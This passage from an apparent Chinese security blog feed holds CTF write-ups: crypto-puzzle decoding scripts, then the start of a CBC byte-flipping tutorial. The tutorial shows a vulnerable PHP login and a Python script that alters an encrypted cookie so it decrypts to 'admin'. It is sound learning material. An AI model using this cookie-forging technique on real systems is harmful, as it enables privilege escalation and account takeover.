class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'base64.txt'</span>) <span class="keyword">as</span> file:</span><br><span class="line"><span class="comment"># base64解码</span></span><br><span class="line">text = file.read()</span><br><span class="line">text = base64.b64decode(text)</span><br><span class="line">text = text.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">alp = re.findall(<span class="string">r'([0-7]+)'</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># base64解码后发现像8进制，8进制转换成10进制</span></span><br><span class="line">new_alp = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> alp:</span><br><span class="line">new_alp.append(int(item,<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ascii解码</span></span><br><span class="line">alp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> new_alp:</span><br><span class="line">alp += str(chr(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 前面的解码后为'\xdd'的形式，推测为16进制</span></span><br><span class="line">plain = <span class="string">''</span></span><br><span class="line">cipher = re.findall(<span class="string">r'\\x([0-9a-f]+)'</span>,alp)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">plain += str(chr(int(i,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unicode解码</span></span><br><span class="line">cipher2 = bytes(plain,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">plain2 = cipher2.decode(<span class="string">'unicode-escape'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ascii解码</span></span><br><span class="line">cipher3 = re.findall(<span class="string">r'[0-9]&#123;2,&#125;'</span>,plain2)</span><br><span class="line">plain3 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher3:</span><br><span class="line">plain3 += chr(int(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># unicode解码</span></span><br><span class="line">cipher4 = re.findall(<span class="string">r'#x([0-9a-f]+)'</span>,plain3)</span><br><span class="line">plain4 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher4:</span><br><span class="line">plain4.append(int(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ascii解码</span></span><br><span class="line">cipher5 = plain4</span><br><span class="line">plain5 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher5:</span><br><span class="line">plain5 += chr(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unicode</span></span><br><span class="line">cipher6 = re.findall(<span class="string">r'&amp;#([0-9]&#123;2,&#125;)'</span>,plain5)</span><br><span class="line">plain6 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher6:</span><br><span class="line">plain6 += chr(int(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># urldecode</span></span><br><span class="line">print(parse.unquote(plain6))</span><br></pre></td></tr></table></figure><h2 id="‘"><a href="#‘" class="headerlink" title="‘!?"></a>‘!?</h2><p>看了别人的wp，这题还是Ook!语言跑一下</p><h2 id=""><a href="#" class="headerlink" title="+[]-"></a>+[]-</h2><p>brainfuck语言跑一下</p><h2 id="奇怪的密码"><a href="#奇怪的密码" class="headerlink" title="奇怪的密码"></a>奇怪的密码</h2><p>其实就是把flag的每一位的ascii值一次加1,2,3,..反过来解一下就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'gndk€rlqhmtkwwp&#125;z'</span></span><br><span class="line">plain = <span class="string">''</span></span><br><span class="line">seq = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line"><span class="keyword">if</span> i == <span class="string">'€'</span>:     <span class="comment"># 该字符为非法字符，不去掉的话可能会报错</span></span><br><span class="line">seq += <span class="number">1</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">plain += chr((ord(i) - seq))</span><br><span class="line">seq += <span class="number">1</span></span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure><h2 id="托马斯杰斐逊"><a href="#托马斯杰斐逊" class="headerlink" title="托马斯杰斐逊"></a>托马斯杰斐逊</h2><p>根据提示可知是杰斐逊圆盘加密，附上解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">tomas = <span class="string">'''ZWAXJGDLUBVIQHKYPNTCRMOSFE</span></span><br><span class="line"><span class="string">KPBELNACZDTRXMJQOYHGVSFUWI</span></span><br><span class="line"><span class="string">BDMAIZVRNSJUWFHTEQGYXPLOCK</span></span><br><span class="line"><span class="string">RPLNDVHGFCUKTEBSXQYIZMJWAO</span></span><br><span class="line"><span class="string">IHFRLABEUOTSGJVDKCPMNZQWXY</span></span><br><span class="line"><span class="string">AMKGHIWPNYCJBFZDRUSLOQXVET</span></span><br><span class="line"><span class="string">GWTHSPYBXIZULVKMRAFDCEONJQ</span></span><br><span class="line"><span class="string">NOZUTWDCVRJLXKISEFAPMYGHBQ</span></span><br><span class="line"><span class="string">QWATDSRFHENYVUBMCOIKZGJXPL</span></span><br><span class="line"><span class="string">WABMCXPLTDSRJQZGOIKFHENYVU</span></span><br><span class="line"><span class="string">XPLTDAOIKFZGHENYSRUBMCQWVJ</span></span><br><span class="line"><span class="string">TDSWAYXPLVUBOIKZGJRFHENMCQ</span></span><br><span class="line"><span class="string">BMCSRFHLTDENQWAOXPYVUIKZGJ</span></span><br><span class="line"><span class="string">XPHKZGJTDSENYVUBMLAOIRFCQW</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">new_tomas = []</span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tomas)):</span><br><span class="line"><span class="keyword">if</span> tomas[i] == <span class="string">'\n'</span>:</span><br><span class="line">new_tomas.append(tmp)</span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">tmp += tomas[i]</span><br><span class="line">key =  [<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">12</span>]</span><br><span class="line">cipher = <span class="string">'HCBTSXWCRQGLES'</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line"><span class="keyword">if</span> new_tomas[key[index]<span class="number">-1</span>][p] == cipher[index]:</span><br><span class="line">new_tomas[key[index]<span class="number">-1</span>] = new_tomas[key[index]<span class="number">-1</span>][p:] + new_tomas[key[index]<span class="number">-1</span>][:p]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> key:</span><br><span class="line">print(new_tomas[item<span class="number">-1</span>][<span class="number">-6</span>:]+new_tomas[item<span class="number">-1</span>][:<span class="number">-6</span>])   <span class="comment"># 让输出更明显一点</span></span><br></pre></td></tr></table></figure><p>输出如下</p><blockquote><p>XMJQOYHGVSFUWIKPBELNACZDTR<br>SGJVDKCPMNZQWXYIHFRLABEUOT<br>XJGDLUBVIQHKYPNTCRMOSFEZWA<br>SJUWFHTEQGYXPLOCKBDMAIZVRN<br>BFZDRUSLOQXVETAMKGHIWPNYCJ<br>UKTEBSXQYIZMJWAORPLNDVHGFC<br>GJXPLQWATDSRFHENYVUBMCOIKZ<br>KMRAFDCEONJQGWTHSPYBXIZULV<br>UTWDCVRJLXKISEFAPMYGHBQNOZ<br>AOIRFCQWXPHKZGJTDSENYVUBML<br>DSRJQZGOIKFHENYVUWABMCXPLT<br>MCSRFHLTDENQWAOXPYVUIKZGJB<br>IKFZGHENYSRUBMCQWVJXPLTDAO<br>NMCQTDSWAYXPLVUBOIKZGJRFHE</p></blockquote><p>好像默认是按照第7位来当做密文，所以我特地按照这个格式来，那么第一列就是明文了，注意flag要求小写。</p><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>已经说了是zip伪加密，直接16进制修改一下即可</p><h2 id="告诉你个秘密-ISCCCTF"><a href="#告诉你个秘密-ISCCCTF" class="headerlink" title="告诉你个秘密(ISCCCTF)"></a>告诉你个秘密(ISCCCTF)</h2><p>看字符串像16进制，转成字符串可以看到像base64，再解码一次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM</span><br></pre></td></tr></table></figure><p>这是键盘对应的码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TONGYUAN</span><br></pre></td></tr></table></figure><p>注意本题没有说明flag的提交方式，应该是 <code>flag:TONGYUAN</code></p><h2 id="来自宇宙的信号"><a href="#来自宇宙的信号" class="headerlink" title="来自宇宙的信号"></a>来自宇宙的信号</h2><p>既然说了是银河战队，直接百度搜 <code>银河 文字</code>，会看到第一个结果赫然是标准银河字母，对照一下就可以了。</p><p>至此，所有加密题目OK。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;杂项&quot;&gt;&lt;a href=&quot;#杂项&quot; class=&quot;headerlink&quot; title=&quot;杂项&quot;&gt;&lt;/a&gt;杂项&lt;/h1&gt;&lt;h2 id=&quot;账号被盗了&quot;&gt;&lt;a href=&quot;#账号被盗了&quot; class=&quot;headerlink&quot; title=&quot;账号被盗了&quot;&gt;&lt;/a&gt;账号被盗了&lt;/h2&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CBC字节翻转攻击</title>
    <link href="http://chaosec.top/2018/03/23/CBC-Attack/"/>
    <id>http://chaosec.top/2018/03/23/CBC-Attack/</id>
    <published>2018-03-23T11:44:31.000Z</published>
    <updated>2019-02-16T08:25:30.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>最近连着看了几篇CBC翻转攻击相关的文章，又正好遇到了这样的题目，所以来做一波看看一下。题目就是bugku上面的这道题目<a href="http://118.89.219.210:49168/index.php" target="_blank" rel="noopener">传送门</a>。</p><a id="more"></a><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h1><p>CBC攻击方法的精髓在于通过损坏密文字节来改变明文字节，从而达到绕过过滤器或者提权等目的。贴一张图片</p><p><img src="/2018/03/23/CBC-Attack/1.png" alt="加密原理"></p><blockquote><p><font face="futura">plaintext:</font>待加密的数据</p><p><font face="futura">Ⅳ：</font>用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文</p><p><font face="“futura">Ciphertext：</font>加密后的数据</p></blockquote><p><strong>注意：</strong>CBC工作于一个固定长度的比特组，称之为块(BLOCK)，本文中将使用16字节的块。</p><p><strong>加密过程：</strong></p><p>1.首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。<br>2.生成一个随机的初始化向量(IV)和一个密钥。<br>3.将IV和第一组明文异或。<br>4.用密钥对3中xor后产生的密文加密。<br>5.用4中产生的密文对第二组明文进行xor操作。<br>6.用密钥对5中产生的密文加密。<br>7.重复4-7，到最后一组明文。<br>8.将IV和加密后的密文拼接在一起，得到最终的密文。</p><p>从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：<em>前一块的密文用来产生后一块的密文</em>。</p><p><strong>解密过程：</strong></p><p><img src="/2018/03/23/CBC-Attack/2.png" alt="解密过程"></p><p>解密过程就是加密过程的逆过程</p><p>1.从密文中提取出IV，然后将密文分组。<br>2.使用密钥对第一组的密文解密，然后和IV进行xor得到明文。<br>3.使用密钥对第二组密文解密，然后和2中的密文xor得到明文。<br>4.重复2-3，直到最后一组密文。</p><p><strong>攻击原理图</strong></p><p><img src="/2018/03/23/CBC-Attack/3.png" alt="攻击过程"></p><p>这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。</p><p>介绍一下异或的概念</p><blockquote><p>当我们的一个值C是由A和B异或得到<br>C = A XOR B<br>那么<br>A XOR B XOR C很明显是=0的<br>当我们知道B和C之后，想要得到A的值也很容易<br>A = B XOR C<br>因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。</p></blockquote><h1 id="上手题目"><a href="#上手题目" class="headerlink" title="上手题目"></a><strong>上手题目</strong></h1><p>存在目录泄露 <code>.index.php.swp</code>，会下载到一个源码，需要用vim恢复一下，使用下面的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi -r &#123;your file name&#125;</span><br></pre></td></tr></table></figure><p>然后用下面的命令删除swp文件，不然每一次编辑时总是有这个提示。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm .&#123;your file name&#125;.swp</span><br></pre></td></tr></table></figure><p>再输入7即可恢复代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;link href=<span class="string">"static/css/style.css"</span> rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> /&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">$(document).ready(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$(<span class="string">".username"</span>).focus(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$(<span class="string">".user-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"-48px"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">".username"</span>).blur(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$(<span class="string">".user-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"0px"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(<span class="string">".password"</span>).focus(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$(<span class="string">".pass-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"-48px"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">$(<span class="string">".password"</span>).blur(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$(<span class="string">".pass-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"0px"</span>);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body"&gt;</span></span><br><span class="line"><span class="string">                &lt;div id="wrapper"&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="user-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="pass-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type="submit" name="submit" value="Login" class="button" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">t</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>一直也不行，心态崩了(2333333…)</p><hr><p>一个星期之后…..</p><hr><p>我胡汉三又回来了！！！！</p><p>我们把返回的cipher值进行翻转，想要翻转第二块的 <code>m</code>为 <code>a</code>只需要把第一行对应第九位翻转一下即可，代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">iv = <span class="string">'sDGucEcgR9ixzDNVm6IrpA%3D%3D'</span></span><br><span class="line">cipher_raw = <span class="string">'xhp6%2B1A%2FKctfyU%2BbQeuRx3lUMrDUN%2FOuXg96c%2FJ%2Byn5DX2UVNMavsdocAGjmu6SmuRD6kY8Ef4rLKYADlEeUjQ%3D%3D'</span></span><br><span class="line">print(<span class="string">"[*]原始iv和cipher"</span>)</span><br><span class="line">print(<span class="string">'翻转前：'</span>)</span><br><span class="line">print(<span class="string">'cipher_raw:'</span>,cipher_raw)</span><br><span class="line">print(<span class="string">'iv_raw:'</span>,iv)</span><br><span class="line">print(<span class="string">'翻转后：'</span>)</span><br><span class="line">tmp1 = urllib.parse.unquote(cipher_raw)</span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(tmp1)</span><br><span class="line"><span class="comment"># a:2:&#123;s:8:"userna</span></span><br><span class="line"><span class="comment"># me";s:5:"mdmin";</span></span><br><span class="line"><span class="comment"># s:8:"password";s</span></span><br><span class="line"><span class="comment"># :6:"123456";&#125;</span></span><br><span class="line"></span><br><span class="line">cipher = cipher.decode(<span class="string">'unicode_escape'</span>)</span><br><span class="line">xor_cipher = cipher[<span class="number">0</span>:<span class="number">9</span>] + chr(ord(cipher[<span class="number">9</span>]) ^ ord(<span class="string">'m'</span>) ^ ord(<span class="string">'a'</span>)) + cipher[<span class="number">10</span>:]</span><br><span class="line">xor_cipher = urllib.parse.quote(base64.b64encode(xor_cipher.encode(<span class="string">'latin-1'</span>)))</span><br><span class="line"></span><br><span class="line">print(xor_cipher)</span><br></pre></td></tr></table></figure><p>写完这个脚本，我心中又不禁对python的编码问题骂了无数次mmp，真的太多坑了…..</p><p>然后修改cookie中的cipher值，刷新页面（注意此时不能提交数据,要把post数据清空）之后，页面会提示反序列化失败，这是因为我们修改mdmin为admin的时候，是通过修改第一块数据来修改的，所以第一个块数据（16字节）被破坏了。因为程序中要求username要等于admin所以不能利用文章里的说的填充字符。 